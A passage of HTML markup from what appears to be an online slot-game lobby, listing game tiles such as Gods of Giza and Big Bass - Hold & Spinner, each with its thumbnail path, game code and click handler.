          <h5 data-title="Kingdom of the Dead™">Kingdom of the Dead™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Cowboy Coins™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Cowboy Coins™', '/assets/games/i/165x220/ebf88a2a10d29d99f8d9f24d3bbec60a.webp?v=0.1' , 'vswaysultrcoin', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/ebf88a2a10d29d99f8d9f24d3bbec60a.webp?v=0.1" src="/assets/games/i/165x220/ebf88a2a10d29d99f8d9f24d3bbec60a.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Cowboy Coins™">Cowboy Coins™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Jane Hunter and the Mask of Montezuma™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Jane Hunter and the Mask of Montezuma™', '/assets/games/i/165x220/7b68c13ce8d1fab670432c07eaf8fc48.webp?v=0.1' , 'vs10jnmntzma', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/7b68c13ce8d1fab670432c07eaf8fc48.webp?v=0.1" src="/assets/games/i/165x220/7b68c13ce8d1fab670432c07eaf8fc48.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Jane Hunter and the Mask of Montezuma™">Jane Hunter and the Mask of Montezuma™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Gods of Giza™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Gods of Giza™', '/assets/games/i/165x220/b16b81329908ce85e19bd1466311f458.webp?v=0.1' , 'vs10gizagods', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/b16b81329908ce85e19bd1466311f458.webp?v=0.1" src="/assets/games/i/165x220/b16b81329908ce85e19bd1466311f458.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Gods of Giza™">Gods of Giza™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Wild Celebrity Bus Megaways™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Wild Celebrity Bus Megaways™', '/assets/games/i/165x220/602959ac0686ec9a26d7a594aa702799.webp?v=0.1' , 'vswaysrsm', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/602959ac0686ec9a26d7a594aa702799.webp?v=0.1" src="/assets/games/i/165x220/602959ac0686ec9a26d7a594aa702799.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Wild Celebrity Bus Megaways™">Wild Celebrity Bus Megaways™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="African Elephant™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'African Elephant™', '/assets/games/i/165x220/ec7a6207c6f1d907000ff6f78f13ec9d.webp?v=0.1' , 'vs20hotzone', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/ec7a6207c6f1d907000ff6f78f13ec9d.webp?v=0.1" src="/assets/games/i/165x220/ec7a6207c6f1d907000ff6f78f13ec9d.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="African Elephant™">African Elephant™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="3 Dancing Monkeys™" data-filter="ALL,NEW,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    '3 Dancing Monkeys™', '/assets/games/i/165x220/01d7e27a83317c45cbe938c4ffda7ee6.webp?v=0.1' , 'vswaysmonkey', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/01d7e27a83317c45cbe938c4ffda7ee6.webp?v=0.1" src="/assets/games/i/165x220/01d7e27a83317c45cbe938c4ffda7ee6.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="3 Dancing Monkeys™">3 Dancing Monkeys™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="The Red Queen™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'The Red Queen™', '/assets/games/i/165x220/5e2e8a59019f088c561f5c3029f0f51a.webp?v=0.1' , 'vswaysredqueen', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/5e2e8a59019f088c561f5c3029f0f51a.webp?v=0.1" src="/assets/games/i/165x220/5e2e8a59019f088c561f5c3029f0f51a.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="The Red Queen™">The Red Queen™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Big Bass - Hold &amp;quot; Spinner™" data-filter="ALL,NEW,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Big Bass - Hold &amp;quot; Spinner™', '/assets/games/i/165x220/8ef028a9394a10c190a1c9583132ba90.webp?v=0.1' , 'vs10bbhas', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/8ef028a9394a10c190a1c9583132ba90.webp?v=0.1" src="/assets/games/i/165x220/8ef028a9394a10c190a1c9583132ba90.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Big Bass - Hold &amp; Spinner™">Big Bass - Hold &amp; Spinner™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Moonshot™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Moonshot™', '/assets/games/i/165x220/79dd2e707ccded954c1f3baa6347045d.webp?v=0.1' , 'vs1024moonsh', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/79dd2e707ccded954c1f3baa6347045d.webp?v=0.1" src="/assets/games/i/165x220/79dd2e707ccded954c1f3baa6347045d.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Moonshot™">Moonshot™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fruits of the Amazon™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fruits of the Amazon™', '/assets/games/i/165x220/23eeacc0dc12592047503a80d0709c7c.webp?v=0.1' , 'vs20framazon', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/23eeacc0dc12592047503a80d0709c7c.webp?v=0.1" src="/assets/games/i/165x220/23eeacc0dc12592047503a80d0709c7c.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fruits of the Amazon™">Fruits of the Amazon™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="The Knight King™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'The Knight King™', '/assets/games/i/165x220/fb898e0261bb7c91be3fe18e6984e02b.webp?v=0.1' , 'vs20sknights', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/fb898e0261bb7c91be3fe18e6984e02b.webp?v=0.1" src="/assets/games/i/165x220/fb898e0261bb7c91be3fe18e6984e02b.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="The Knight King™">The Knight King™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Rabbit Garden™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Rabbit Garden™', '/assets/games/i/165x220/b13028008e8f0f14e4d4091d4efc5441.webp?v=0.1' , 'vs20goldclust', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/b13028008e8f0f14e4d4091d4efc5441.webp?v=0.1" src="/assets/games/i/165x220/b13028008e8f0f14e4d4091d4efc5441.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Rabbit Garden™">Rabbit Garden™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="The Dog House Multihold™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'The Dog House Multihold™', '/assets/games/i/165x220/f221a466fb253b1d86055f10698da967.webp?v=0.1' , 'vs20doghousemh', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/f221a466fb253b1d86055f10698da967.webp?v=0.1" src="/assets/games/i/165x220/f221a466fb253b1d86055f10698da967.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="The Dog House Multihold™">The Dog House Multihold™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Mystery Of The Orient™" data-filter="ALL,NEW,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Mystery Of The Orient™', '/assets/games/i/165x220/2d10b4bcaf6dc5c51530d7b9273c307c.webp?v=0.1' , 'vswaysmorient', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/2d10b4bcaf6dc5c51530d7b9273c307c.webp?v=0.1" src="/assets/games/i/165x220/2d10b4bcaf6dc5c51530d7b9273c307c.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Mystery Of The Orient™">Mystery Of The Orient™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Wild West Duels™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Wild West Duels™', '/assets/games/i/165x220/247b3e8e0c25f5c53fff2b53f3cadea7.webp?v=0.1' , 'vs20pistols', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/247b3e8e0c25f5c53fff2b53f3cadea7.webp?v=0.1" src="/assets/games/i/165x220/247b3e8e0c25f5c53fff2b53f3cadea7.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Wild West Duels™">Wild West Duels™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Peak Power™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Peak Power™', '/assets/games/i/165x220/0e0e528de84db0c1fea8e8a820b0066a.webp?v=0.1' , 'vs10powerlines', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/0e0e528de84db0c1fea8e8a820b0066a.webp?v=0.1" src="/assets/games/i/165x220/0e0e528de84db0c1fea8e8a820b0066a.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Peak Power™">Peak Power™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Wild Wild Riches Megaways™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Wild Wild Riches Megaways™', '/assets/games/i/165x220/65a9d78cb9b50ad662b2174eea916fa8.webp?v=0.1' , 'vswayswwriches', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/65a9d78cb9b50ad662b2174eea916fa8.webp?v=0.1" src="/assets/games/i/165x220/65a9d78cb9b50ad662b2174eea916fa8.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Wild Wild Riches Megaways™">Wild Wild Riches Megaways™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fire Archer™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fire Archer™', '/assets/games/i/165x220/4366fe831e764cd433a6816d56c56450.webp?v=0.1' , 'vs25archer', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/4366fe831e764cd433a6816d56c56450.webp?v=0.1" src="/assets/games/i/165x220/4366fe831e764cd433a6816d56c56450.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fire Archer™">Fire Archer™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Club Tropicana" data-filter="ALL,NEW,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Club Tropicana', '/assets/games/i/165x220/62f927913b3f563a8615df3f74c10d31.webp?v=0.1' , 'vs12tropicana', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/62f927913b3f563a8615df3f74c10d31.webp?v=0.1" src="/assets/games/i/165x220/62f927913b3f563a8615df3f74c10d31.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Club Tropicana">Club Tropicana</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Mochimon™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Mochimon™', '/assets/games/i/165x220/75bb36cf2e5f6d2e062a4eb8d3ea6865.webp?v=0.1' , 'vs20mochimon', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/75bb36cf2e5f6d2e062a4eb8d3ea6865.webp?v=0.1" src="/assets/games/i/165x220/75bb36cf2e5f6d2e062a4eb8d3ea6865.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Mochimon™">Mochimon™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Gatot Kaca&amp;quot;amp;s Fury™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Gatot Kaca&amp;quot;amp;s Fury™', '/assets/games/i/165x220/91a167578ca6bfafb0252853f80386a4.webp?v=0.1' , 'vs20gatotfury', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/91a167578ca6bfafb0252853f80386a4.webp?v=0.1" src="/assets/games/i/165x220/91a167578ca6bfafb0252853f80386a4.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Gatot Kaca's Fury™">Gatot Kaca's Fury™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Monster Superlanche™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Monster Superlanche™', '/assets/games/i/165x220/6a543942379853d93a05c446b1a2995b.webp?v=0.1' , 'vs20superlanche', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/6a543942379853d93a05c446b1a2995b.webp?v=0.1" src="/assets/games/i/165x220/6a543942379853d93a05c446b1a2995b.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Monster Superlanche™">Monster Superlanche™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fish Eye" data-filter="ALL,NEW,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fish Eye', '/assets/games/i/165x220/d9b061e58277ac31f43a7db75d614cfc.webp?v=0.1' , 'vs10fisheye', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/d9b061e58277ac31f43a7db75d614cfc.webp?v=0.1" src="/assets/games/i/165x220/d9b061e58277ac31f43a7db75d614cfc.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fish Eye">Fish Eye</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Secret City Gold™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Secret City Gold™', '/assets/games/i/165x220/1a75516bf6092363b829ffa236011dbb.webp?v=0.1' , 'vs25spgldways', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/1a75516bf6092363b829ffa236011dbb.webp?v=0.1" src="/assets/games/i/165x220/1a75516bf6092363b829ffa236011dbb.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Secret City Gold™">Secret City Gold™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Pinup Girls™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Pinup Girls™', '/assets/games/i/165x220/d3b72d348f8b8797384aaeae54cb14ba.webp?v=0.1' , 'vs20ltng', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/d3b72d348f8b8797384aaeae54cb14ba.webp?v=0.1" src="/assets/games/i/165x220/d3b72d348f8b8797384aaeae54cb14ba.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Pinup Girls™">Pinup Girls™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Wild Wild Bananas™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Wild Wild Bananas™', '/assets/games/i/165x220/7314dead68d19380f5eb08dfeba59f89.webp?v=0.1' , 'vswayswwhex', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/7314dead68d19380f5eb08dfeba59f89.webp?v=0.1" src="/assets/games/i/165x220/7314dead68d19380f5eb08dfeba59f89.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Wild Wild Bananas™">Wild Wild Bananas™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Gates of Aztec™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Gates of Aztec™', '/assets/games/i/165x220/02714ee8572e13403f506df5d4274b13.webp?v=0.1' , 'vs20aztecgates', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/02714ee8572e13403f506df5d4274b13.webp?v=0.1" src="/assets/games/i/165x220/02714ee8572e13403f506df5d4274b13.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Gates of Aztec™">Gates of Aztec™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fury of Odin Megaways™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fury of Odin Megaways™', '/assets/games/i/165x220/778b6ee2ff493bed8cbdaed62c32bae9.webp?v=0.1' , 'vswaysfuryodin', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/778b6ee2ff493bed8cbdaed62c32bae9.webp?v=0.1" src="/assets/games/i/165x220/778b6ee2ff493bed8cbdaed62c32bae9.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fury of Odin Megaways™">Fury of Odin Megaways™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Mammoth Gold Megaways" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Mammoth Gold Megaways', '/assets/games/i/165x220/15c3ecf0aa69d2b95bfa2f4b619a8f0a.webp?v=0.1' , 'vs20mammoth', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/15c3ecf0aa69d2b95bfa2f4b619a8f0a.webp?v=0.1" src="/assets/games/i/165x220/15c3ecf0aa69d2b95bfa2f4b619a8f0a.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Mammoth Gold Megaways">Mammoth Gold Megaways</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Hot Pepper™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Hot Pepper™', '/assets/games/i/165x220/f892ff72f78bda4ca508137129e50ead.webp?v=0.1' , 'vs20dugems', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/f892ff72f78bda4ca508137129e50ead.webp?v=0.1" src="/assets/games/i/165x220/f892ff72f78bda4ca508137129e50ead.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Hot Pepper™">Hot Pepper™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Sweet Powernudge™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Sweet Powernudge™', '/assets/games/i/165x220/da4a04c3b04ba46c12da498b5152cf6a.webp?v=0.1' , 'vs20clspwrndg', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/da4a04c3b04ba46c12da498b5152cf6a.webp?v=0.1" src="/assets/games/i/165x220/da4a04c3b04ba46c12da498b5152cf6a.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Sweet Powernudge™">Sweet Powernudge™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Jungle Gorilla" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Jungle Gorilla', '/assets/games/i/165x220/f34d949d5035062ee8f1d35b6465ce89.webp?v=0.1' , 'vs20gorilla', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/f34d949d5035062ee8f1d35b6465ce89.webp?v=0.1" src="/assets/games/i/165x220/f34d949d5035062ee8f1d35b6465ce89.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Jungle Gorilla">Jungle Gorilla</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Reel Banks™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Reel Banks™', '/assets/games/i/165x220/6db59209e3ef35340fc11277d6f47385.webp?v=0.1' , 'vs25rlbank', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/6db59209e3ef35340fc11277d6f47385.webp?v=0.1" src="/assets/games/i/165x220/6db59209e3ef35340fc11277d6f47385.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Reel Banks™">Reel Banks™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="PIZZA! PIZZA? PIZZA!™" data-filter="ALL,NEW,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'PIZZA! PIZZA? PIZZA!™', '/assets/games/i/165x220/f02eaee6c5dd182bcaff8d882fdde5af.webp?v=0.1' , 'vswayspizza', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/f02eaee6c5dd182bcaff8d882fdde5af.webp?v=0.1" src="/assets/games/i/165x220/f02eaee6c5dd182bcaff8d882fdde5af.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="PIZZA! PIZZA? PIZZA!™">PIZZA! PIZZA? PIZZA!™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Dragon Hero™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Dragon Hero™', '/assets/games/i/165x220/e3d5cf745ccf8c9d911fde39a55d279a.webp?v=0.1' , 'vs20drgbless', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/e3d5cf745ccf8c9d911fde39a55d279a.webp?v=0.1" src="/assets/games/i/165x220/e3d5cf745ccf8c9d911fde39a55d279a.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Dragon Hero™">Dragon Hero™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="5 Rabbits Megaways™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    '5 Rabbits Megaways™', '/assets/games/i/165x220/20517e5b9ec3c5ee14f5e4ad8013e918.webp?v=0.1' , 'vswaysrabbits', '' )" style="">

          <div class="content-wrapper">
              
